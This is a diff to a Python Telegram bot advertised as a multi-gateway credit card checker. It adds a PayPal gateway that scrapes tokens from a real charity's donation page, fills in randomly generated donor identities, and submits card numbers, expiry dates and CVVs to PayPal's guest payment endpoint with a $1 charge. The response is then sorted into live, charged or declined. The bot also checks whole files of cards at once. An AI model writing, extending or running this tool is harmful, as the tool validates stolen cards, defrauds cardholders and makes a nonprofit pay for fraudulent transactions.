@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Real Multi Gateway CC Checker Bot
-Version: 8.0 - Full Features with Progress Bar
+Version: 9.0 - Three Gateways (Stripe v1, Stripe v2, PayPal)
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -102,6 +102,16 @@ GATES = {
         "enabled": True,
         "timeout": 30,
         "icon": "💎",
+        "default": False
+    },
+    "paypal": {
+        "name": "💸 PayPal Charge",
+        "description": "فحص بطاقات عبر PayPal Commerce",
+        "command": "pay",
+        "mass_command": "paym",
+        "enabled": True,
+        "timeout": 30,
+        "icon": "💸",
         "default": False
     }
 }
@@ -414,7 +424,7 @@ class DataManager:
                 "usage": {"total_checks": 0, "approved": 0, "declined": 0}
             }
         
-        is_approved = any(x in result for x in ["✅", "LIVE", "Approved", "approved", "UwU"])
+        is_approved = any(x in result for x in ["✅", "LIVE", "Approved", "approved", "UwU", "CHARGED"])
         
         usage = users[uid].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
         usage["total_checks"] += 1
@@ -636,6 +646,8 @@ class ResultFormatter:
             status_text = "LIVE - CVV ERROR"
         elif "stolen" in result.lower() or "risk" in result.lower():
             status_text = "LIVE - RISK CARD"
+        elif "charged" in result.lower():
+            status_text = "CHARGED"
         
         return f"""
 𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
@@ -662,13 +674,16 @@ class ResultFormatter:
         masked = f"{number[:6]}xxxxxx{number[-4:]}"
         
         if is_approved:
-            status_text = "✅ LIVE - CARD APPROVED"
-            if "cvv" in result.lower():
+            if "charged" in result.lower():
+                status_text = "✅ CHARGED - Payment Successful"
+            elif "cvv" in result.lower():
                 status_text = "💳 LIVE - CVV ERROR"
             elif "insufficient" in result.lower():
                 status_text = "💰 LIVE - INSUFFICIENT FUNDS"
             elif "stolen" in result.lower() or "risk" in result.lower():
                 status_text = "⚠️ LIVE - RISK CARD"
+            else:
+                status_text = "✅ LIVE - CARD APPROVED"
         else:
             status_text = "❌ DECLINED"
         
@@ -938,18 +953,325 @@ class StripeGateway2:
         except Exception as e:
             return False, f"⚠️ Error: {str(e)[:50]}"
 
+# ==================== بوابة PayPal ====================
+class PayPalGateway:
+    """PayPal Charge Gateway - awwatersheds.org"""
+    
+    FIRST_NAMES = [
+        "James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda",
+        "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica",
+        "Thomas", "Sarah", "Christopher", "Karen", "Daniel", "Lisa", "Matthew", "Nancy",
+        "Anthony", "Betty", "Mark", "Margaret", "Donald", "Sandra", "Steven", "Ashley",
+        "Paul", "Dorothy", "Andrew", "Kimberly", "Joshua", "Emily", "Kenneth", "Donna"
+    ]
+    
+    LAST_NAMES = [
+        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
+        "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
+        "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
+        "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker"
+    ]
+    
+    ADDRESSES = [
+        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
+        {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
+        {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
+        {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
+        {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
+        {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
+        {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
+        {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
+        {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
+        {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
+    ]
+    
+    PHONE_PREFIXES = ["212", "310", "312", "415", "602", "713", "206", "305", "404", "503"]
+    EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
+    
+    def random_donor(self) -> Dict[str, str]:
+        first = random.choice(self.FIRST_NAMES)
+        last = random.choice(self.LAST_NAMES)
+        addr = random.choice(self.ADDRESSES)
+        phone = random.choice(self.PHONE_PREFIXES) + ''.join([str(random.randint(0, 9)) for _ in range(7)])
+        domain = random.choice(self.EMAIL_DOMAINS)
+        email = f"{first.lower()}{random.randint(10, 9999)}@{domain}"
+        return {
+            "first": first,
+            "last": last,
+            "email": email,
+            "phone": phone,
+            "address": addr
+        }
+    
+    @staticmethod
+    def detect_type(n: str) -> str:
+        n = n.replace(" ", "").replace("-", "")
+        if n.startswith("4"):
+            return "VISA"
+        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
+            return "MASTER_CARD"
+        elif n.startswith(("34", "37")):
+            return "AMEX"
+        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n):
+            return "DISCOVER"
+        return "VISA"
+    
+    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
+        try:
+            donor = self.random_donor()
+            session = requests.Session()
+            session.verify = True
+            ua_str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+            ajax_headers = {
+                "User-Agent": ua_str,
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Origin": "https://awwatersheds.org",
+                "Referer": "https://awwatersheds.org/donate/",
+                "X-Requested-With": "XMLHttpRequest"
+            }
+            
+            # Scrape tokens
+            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=20)
+            html = r.text
+            
+            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', html)
+            if not hash_match:
+                hash_match = re.search(r'"base_hash":"(.*?)"', html)
+            if not hash_match:
+                return False, "❌ Failed to get form hash"
+            
+            pfx_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+            id_match = re.search(r'name="give-form-id" value="(.*?)"', html)
+            
+            if not pfx_match or not id_match:
+                return False, "❌ Failed to get form data"
+            
+            tokens = {
+                'hash': hash_match.group(1),
+                'pfx': pfx_match.group(1),
+                'id': id_match.group(1)
+            }
+            
+            # Register donation
+            data = {
+                "give-honeypot": "",
+                "give-form-id-prefix": tokens['pfx'],
+                "give-form-id": tokens['id'],
+                "give-form-title": "Sustainers Circle",
+                "give-current-url": "https://awwatersheds.org/donate/",
+                "give-form-url": "https://awwatersheds.org/donate/",
+                "give-form-hash": tokens['hash'],
+                "give-price-id": "custom",
+                "give-amount": "1.00",
+                "payment-mode": "paypal-commerce",
+                "give_first": donor["first"],
+                "give_last": donor["last"],
+                "give_email": donor["email"],
+                "give-lake-affiliation": "Other",
+                "give_action": "purchase",
+                "give-gateway": "paypal-commerce",
+                "action": "give_process_donation",
+                "give_ajax": "true"
+            }
+            
+            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, timeout=20)
+            if r.status_code != 200:
+                return False, "❌ Donation registration failed"
+            
+            # Create order
+            data = {
+                "give-honeypot": "",
+                "give-form-id-prefix": tokens['pfx'],
+                "give-form-id": tokens['id'],
+                "give-form-hash": tokens['hash'],
+                "payment-mode": "paypal-commerce",
+                "give-amount": "1.00",
+                "give-gateway": "paypal-commerce",
+            }
+            
+            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
+                            params={"action": "give_paypal_commerce_create_order"},
+                            headers=ajax_headers, data=data, timeout=20)
+            order_data = r.json()
+            
+            if not order_data.get("success") or not order_data.get("data", {}).get("id"):
+                return False, "❌ PayPal order creation failed"
+            
+            order_id = order_data["data"]["id"]
+            
+            # Charge card
+            addr = donor["address"]
+            full_yy = card_data['year'] if len(card_data['year']) == 4 else "20" + card_data['year']
+            
+            graphql_h = {
+                "Host": "www.paypal.com",
+                "Paypal-Client-Context": order_id,
+                "X-App-Name": "standardcardfields",
+                "Paypal-Client-Metadata-Id": order_id,
+                "User-Agent": ua_str,
+                "Content-Type": "application/json",
+                "Origin": "https://www.paypal.com",
+                "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
+                "X-Country": "US"
+            }
+            
+            query = """
+            mutation payWithCard(
+                $token: String!
+                $card: CardInput
+                $paymentToken: String
+                $phoneNumber: String
+                $firstName: String
+                $lastName: String
+                $shippingAddress: AddressInput
+                $billingAddress: AddressInput
+                $email: String
+                $currencyConversionType: CheckoutCurrencyConversionType
+                $installmentTerm: Int
+                $identityDocument: IdentityDocumentInput
+                $feeReferenceId: String
+            ) {
+                approveGuestPaymentWithCreditCard(
+                    token: $token
+                    card: $card
+                    paymentToken: $paymentToken
+                    phoneNumber: $phoneNumber
+                    firstName: $firstName
+                    lastName: $lastName
+                    email: $email
+                    shippingAddress: $shippingAddress
+                    billingAddress: $billingAddress
+                    currencyConversionType: $currencyConversionType
+                    installmentTerm: $installmentTerm
+                    identityDocument: $identityDocument
+                    feeReferenceId: $feeReferenceId
+                ) {
+                    flags { is3DSecureRequired }
+                    cart {
+                        intent
+                        cartId
+                        buyer { userId auth { accessToken } }
+                        returnUrl { href }
+                    }
+                    paymentContingencies {
+                        threeDomainSecure {
+                            status method
+                            redirectUrl { href }
+                            parameter
+                        }
+                    }
+                }
+            }
+            """
+            
+            billing = {
+                "givenName": donor["first"],
+                "familyName": donor["last"],
+                "line1": addr["line1"],
+                "line2": None,
+                "city": addr["city"],
+                "state": addr["state"],
+                "postalCode": addr["zip"],
+                "country": "US"
+            }
+            
+            variables = {
+                "token": order_id,
+                "card": {
+                    "cardNumber": card_data['number'],
+                    "type": self.detect_type(card_data['number']),
+                    "expirationDate": f"{card_data['month']}/{full_yy}",
+                    "postalCode": addr["zip"],
+                    "securityCode": card_data['cvv']
+                },
+                "phoneNumber": donor["phone"],
+                "firstName": donor["first"],
+                "lastName": donor["last"],
+                "email": donor["email"],
+                "billingAddress": billing,
+                "shippingAddress": billing,
+                "currencyConversionType": "PAYPAL"
+            }
+            
+            r = requests.post(
+                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
+                headers=graphql_h,
+                json={"query": query, "variables": variables},
+                timeout=30
+            )
+            paypal_text = r.text
+            
+            # Approve order
+            data = {
+                "give-honeypot": "",
+                "give-form-id-prefix": tokens['pfx'],
+                "give-form-id": tokens['id'],
+                "give-form-hash": tokens['hash'],
+                "payment-mode": "paypal-commerce",
+                "give-amount": "1.00",
+                "give-gateway": "paypal-commerce",
+            }
+            
+            r = session.post(
+                "https://awwatersheds.org/wp-admin/admin-ajax.php",
+                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
+                headers=ajax_headers, data=data, timeout=30
+            )
+            
+            # Analyze response
+            t = paypal_text.upper()
+            
+            if 'APPROVESTATE":"APPROVED' in t:
+                return True, "✅ CHARGED - Payment Approved!"
+            if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
+                return True, "✅ CHARGED - Auth Successful!"
+            if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
+                return True, "✅ CHARGED!"
+            if 'CVV2_FAILURE' in t:
+                return True, "💳 CVV2 FAILURE (Card is LIVE)"
+            if 'INVALID_SECURITY_CODE' in t:
+                return True, "💳 CCN - Invalid Security Code (LIVE)"
+            if 'INVALID_BILLING_ADDRESS' in t:
+                return True, "✅ AVS FAILED (LIVE)"
+            if 'INSUFFICIENT_FUNDS' in t:
+                return True, "💰 Insufficient Funds (LIVE CARD)"
+            
+            combined = t
+            declines = [
+                ('DO_NOT_HONOR', 'Do Not Honor'),
+                ('ACCOUNT_CLOSED', 'Account Closed'),
+                ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
+                ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
+                ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
+                ('EXPIRED_CARD', 'EXPIRED CARD'),
+            ]
+            
+            for keyword, msg in declines:
+                if keyword in combined:
+                    return False, f"❌ {msg}"
+            
+            return False, "❌ DECLINED"
+            
+        except Exception as e:
+            return False, f"⚠️ Error: {str(e)[:50]}"
+
 # ==================== بوابات الفحص ====================
 class RealGateways:
     def __init__(self):
         self.gateway1 = StripeGateway1()
         self.gateway2 = StripeGateway2()
+        self.gateway3 = PayPalGateway()
     
     async def check_card(self, gate: str, card: Dict, site_url: str = None) -> Tuple[bool, str]:
         if gate == 'stripe1':
             return await self.gateway1.process_card(site_url, card)
         elif gate == 'stripe2':
             return await self.gateway2.process_card(card)
-        return False, "❌ بوابة غير مدعومة"
+        elif gate == 'paypal':
+            return await self.gateway3.check_card(card)
+        else:
+            return False, "❌ بوابة غير مدعومة"
 
 # ==================== واجهة المستخدم ====================
 class UserInterface:
@@ -961,6 +1283,7 @@ class UserInterface:
             btns = [
                 InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                 InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
+                InlineKeyboardButton("💸 PayPal", callback_data="gate_paypal"),
                 InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
                 InlineKeyboardButton("⚙️ البوابة الافتراضية", callback_data="default_gate"),
                 InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
@@ -973,6 +1296,7 @@ class UserInterface:
             btns = [
                 InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                 InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
+                InlineKeyboardButton("💸 PayPal", callback_data="gate_paypal"),
                 InlineKeyboardButton("📁 فحص آخر ملف", callback_data="check_last_file"),
                 InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                 InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
@@ -1077,10 +1401,18 @@ class CommandHandler:
 <b>🚪 البوابة الافتراضية:</b> {default_gate_name}
 <b>💡 يمكنك إرسال البطاقة مباشرة وسيتم فحصها تلقائياً!</b>
 
-<b>📝 الطرق المتاحة:</b>
-• أرسل البطاقة مباشرة: <code>4111111111111111|12|25|123</code>
-• أرسل ملف txt وسيتم فحص جميع البطاقات
-• استخدم /st1 أو /st2 لاختيار بوابة معينة
+<b>📝 البوابات المتاحة:</b>
+💳 Stripe v1 - فحص عبر SetupIntent
+💎 Stripe v2 - فحص بديل
+💸 PayPal Charge - فحص عبر PayPal Commerce
+
+<b>📝 الأوامر:</b>
+/st1 - فحص بطاقة عبر Stripe v1
+/st2 - فحص بطاقة عبر Stripe v2
+/pay - فحص بطاقة عبر PayPal
+/st1m - فحص ملف عبر Stripe v1
+/st2m - فحص ملف عبر Stripe v2
+/paym - فحص ملف عبر PayPal
 
 <b>📢 القناة:</b> {CHANNEL_USERNAME}
 <b>👨‍💻 المطور:</b> {DEV_CONTACT}
@@ -1092,9 +1424,9 @@ class CommandHandler:
 <b>🚪 البوابة الافتراضية:</b> {default_gate_name}
 
 <b>📝 كيفية الاستخدام في المجموعة:</b>
-• أرسل البطاقة مباشرة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>
+• أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>
 • أرسل ملف txt مع منشن البوت
-• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot
+• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot أو /pay@ObeidaOnlineBot
 
 <b>📢 القناة:</b> {CHANNEL_USERNAME}
 <b>👨‍💻 المطور:</b> {DEV_CONTACT}
@@ -1300,8 +1632,8 @@ class CommandHandler:
 🚪 البوابة: {GATES[gate]['name']}
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
-المقبولة  : ✅ 0
-المرفوضة : ❌ 0
+✅ المقبولة: 0
+❌ المرفوضة: 0
 🔄 جاري بدء الفحص...
 """
         bot.reply_to(message, start_msg, parse_mode='HTML')
@@ -1309,24 +1641,22 @@ class CommandHandler:
         asyncio.run_coroutine_threadsafe(self.process_mass_async(check_id, gate), asyncio.new_event_loop())
     
     async def process_mass_async(self, check_id, gate):
-    """معالجة الفحص المتعدد مع تحديث مباشر للأرقام"""
-    data = self.active_checks.get(check_id)
-    if not data:
-        return
-    
-    cards = data['cards']
-    uid, cid = data['user_id'], data['chat_id']
-    stats = self.live_stats[uid]
-    gate_name = GATES[gate]['name']
-    
-    results_text = ResultFormatter.format_mass_result_header(len(cards), gate_name)
-    
-    # رسالة البداية
-    progress_msg = await asyncio.get_event_loop().run_in_executor(
-        None,
-        lambda: bot.send_message(
-            cid,
-            f"""
+        data = self.active_checks.get(check_id)
+        if not data:
+            return
+        
+        cards = data['cards']
+        uid, cid = data['user_id'], data['chat_id']
+        stats = self.live_stats[uid]
+        gate_name = GATES[gate]['name']
+        
+        results_text = ResultFormatter.format_mass_result_header(len(cards), gate_name)
+        
+        progress_msg = await asyncio.get_event_loop().run_in_executor(
+            None,
+            lambda: bot.send_message(
+                cid,
+                f"""
 🚀  جاري الفحص المتسلسل 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
@@ -1338,33 +1668,31 @@ class CommandHandler:
 ❌ المرفوضة: 0
 🔄 جاري الفحص...
 """,
-            parse_mode='HTML',
-            reply_markup=self.ui.stop_button(check_id)
-        )
-    )
-    
-    card_results = []
-    approved_cards = []
-    
-    for i, card in enumerate(cards, 1):
-        if data.get('stop'):
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    f"⛔ تم إيقاف الفحص\n\n✅ المقبولة: {stats['approved']}\n❌ المرفوضة: {stats['declined']}\n📊 تم فحص: {stats['checked']}/{len(cards)}",
-                    progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML'
-                )
+                parse_mode='HTML',
+                reply_markup=self.ui.stop_button(check_id)
             )
-            break
+        )
         
-        try:
-            current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
+        card_results = []
+        
+        for i, card in enumerate(cards, 1):
+            if data.get('stop'):
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        f"⛔ تم إيقاف الفحص\n\n✅ المقبولة: {stats['approved']}\n❌ المرفوضة: {stats['declined']}\n📊 تم فحص: {stats['checked']}/{len(cards)}",
+                        progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML'
+                    )
+                )
+                break
             
-            # تحديث شريط التقدم مع الأرقام الحالية
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    f"""
+            try:
+                current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
+                
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        f"""
 🚀  جاري الفحص المتسلسل 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
@@ -1376,28 +1704,25 @@ class CommandHandler:
 ❌ المرفوضة: {stats['declined']}
 🔄 جاري فحص: {current_card}
 """,
-                    progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
-                    reply_markup=self.ui.stop_button(check_id)
+                        progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(check_id)
+                    )
                 )
-            )
-            
-            # فحص البطاقة
-            approved, resp = await self.gateways.check_card(gate, card)
-            stats['checked'] += 1
-            
-            card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
-            card_results.append(card_result)
-            
-            # ========== معالجة النتيجة ==========
-            if approved:
-                stats['approved'] += 1
                 
-                # تنسيق البطاقة المقبولة
-                number = card['number']
-                masked = f"{number[:6]}xxxxxx{number[-4:]}"
-                bin_info = Helpers.get_bin_info(number[:6])
+                approved, resp = await self.gateways.check_card(gate, card)
+                stats['checked'] += 1
                 
-                approved_msg = f"""
+                card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
+                card_results.append(card_result)
+                
+                if approved:
+                    stats['approved'] += 1
+                    
+                    number = card['number']
+                    masked = f"{number[:6]}xxxxxx{number[-4:]}"
+                    bin_info = Helpers.get_bin_info(number[:6])
+                    
+                    approved_msg = f"""
 ✅ <b>بطاقة مقبولة</b>
 ━━━━━━━━━━━━
 <b>💳 البطاقة:</b> <code>{card['original']}</code>
@@ -1410,27 +1735,24 @@ class CommandHandler:
 ━━━━━━━━━━━━
 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
+                    
+                    await asyncio.get_event_loop().run_in_executor(
+                        None,
+                        lambda: bot.send_message(cid, approved_msg, parse_mode='HTML')
+                    )
+                    
+                    DataManager.save_card_result(card['original'], gate_name, resp, uid, True)
+                    
+                else:
+                    stats['declined'] += 1
+                    DataManager.save_card_result(card['original'], gate_name, resp, uid, False)
                 
-                # إرسال البطاقة المقبولة فوراً
+                DataManager.update_usage(uid, gate, resp)
+                
                 await asyncio.get_event_loop().run_in_executor(
                     None,
-                    lambda: bot.send_message(cid, approved_msg, parse_mode='HTML')
-                )
-                
-                DataManager.save_card_result(card['original'], gate_name, resp, uid, True)
-                
-            else:
-                stats['declined'] += 1
-                DataManager.save_card_result(card['original'], gate_name, resp, uid, False)
-            
-            # تحديث الإحصائيات
-            DataManager.update_usage(uid, gate, resp)
-            
-            # تحديث شريط التقدم بعد الفحص (مع الأرقام الجديدة)
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    f"""
+                    lambda: bot.edit_message_text(
+                        f"""
 🚀  جاري الفحص المتسلسل 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
@@ -1442,24 +1764,23 @@ class CommandHandler:
 ❌ المرفوضة: {stats['declined']}
 🔄 تم فحص: {stats['checked']}/{len(cards)}
 """,
-                    progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
-                    reply_markup=self.ui.stop_button(check_id)
+                        progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(check_id)
+                    )
                 )
-            )
-            
-            await asyncio.sleep(1.5)
-            
-        except Exception as e:
-            stats['checked'] += 1
-            stats['declined'] += 1
-            card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
-            card_results.append(card_result)
-            
-            # تحديث مع الخطأ
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.edit_message_text(
-                    f"""
+                
+                await asyncio.sleep(1.5)
+                
+            except Exception as e:
+                stats['checked'] += 1
+                stats['declined'] += 1
+                card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
+                card_results.append(card_result)
+                
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        f"""
 🚀  جاري الفحص المتسلسل 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
@@ -1471,25 +1792,22 @@ class CommandHandler:
 ❌ المرفوضة: {stats['declined']}
 🔄 تم فحص: {stats['checked']}/{len(cards)} (⚠️ خطأ)
 """,
-                    progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
-                    reply_markup=self.ui.stop_button(check_id)
+                        progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(check_id)
+                    )
                 )
-            )
-    
-    # تجميع النتائج النهائية
-    results_text += "\n".join(card_results)
-    results_text += ResultFormatter.format_mass_result_footer(
-        stats['approved'], stats['declined'], len(cards), len(cards) - stats['checked']
-    )
-    
-    # إرسال التقرير النهائي
-    await asyncio.get_event_loop().run_in_executor(
-        None,
-        lambda: bot.edit_message_text(results_text, progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML')
-    )
-    
-    # إرسال ملخص نهائي
-    summary = f"""
+        
+        results_text += "\n".join(card_results)
+        results_text += ResultFormatter.format_mass_result_footer(
+            stats['approved'], stats['declined'], len(cards), len(cards) - stats['checked']
+        )
+        
+        await asyncio.get_event_loop().run_in_executor(
+            None,
+            lambda: bot.edit_message_text(results_text, progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML')
+        )
+        
+        summary = f"""
 ✅ <b>اكتمل الفحص</b>
 ━━━━━━━━━━━━
 📊 إجمالي البطاقات: {len(cards)}
@@ -1500,14 +1818,14 @@ class CommandHandler:
 {'📌 تم إرسال البطاقات المقبولة فوراً' if stats['approved'] > 0 else '❌ لا توجد بطاقات مقبولة'}
 📁 تم حفظ النتائج في الملفات
 """
-    
-    await asyncio.get_event_loop().run_in_executor(
-        None,
-        lambda: bot.send_message(cid, summary, parse_mode='HTML')
-    )
-    
-    del self.active_checks[check_id]
-    del self.live_stats[uid]
+        
+        await asyncio.get_event_loop().run_in_executor(
+            None,
+            lambda: bot.send_message(cid, summary, parse_mode='HTML')
+        )
+        
+        del self.active_checks[check_id]
+        del self.live_stats[uid]
     
     def stop_check(self, call, check_id):
         if check_id in self.active_checks:
@@ -1702,7 +2020,7 @@ class CallbackHandler:
             self.handler.handle_default_gate(call.message)
         
         elif data == "mass_check":
-            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m لفحص آخر ملف",
+            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m أو /paym لفحص آخر ملف",
                                  call.message.chat.id, call.message.message_id,
                                  reply_markup=UserInterface.back_button())
         
@@ -1763,17 +2081,26 @@ def setup():
     @bot.message_handler(commands=['removesub'])
     def removesub(m): handler.handle_remove_sub(m)
     
+    # Stripe v1 commands
     @bot.message_handler(commands=['st1'])
     def stripe1(m): handler.handle_single(m, 'stripe1')
     
     @bot.message_handler(commands=['st1m'])
     def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
     
+    # Stripe v2 commands
     @bot.message_handler(commands=['st2'])
     def stripe2(m): handler.handle_single(m, 'stripe2')
     
     @bot.message_handler(commands=['st2m'])
     def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
+    
+    # PayPal commands
+    @bot.message_handler(commands=['pay'])
+    def paypal(m): handler.handle_single(m, 'paypal')
+    
+    @bot.message_handler(commands=['paym'])
+    def paypal_mass(m): handler.handle_mass(m, 'paypal')
     
     @bot.message_handler(content_types=['document'])
     def handle_document(m):
@@ -1816,24 +2143,12 @@ def setup():
     threading.Thread(target=run_health, daemon=True).start()
     
     print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
-    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
